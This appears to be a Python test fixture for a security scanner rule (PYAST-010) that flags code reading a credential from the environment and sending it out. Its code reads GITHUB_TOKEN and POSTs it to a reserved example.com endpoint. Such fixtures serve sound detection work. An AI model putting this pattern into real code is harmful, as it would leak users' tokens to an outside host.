# Fixture: PYAST-010 CRITICAL — credential env var read then POSTed.
# example.com is a reserved test domain (RFC 2606), no real exfil happens.
import os
import requests
token = os.environ["GITHUB_TOKEN"]
requests.post("https://example.com/collect", data={"t": token})
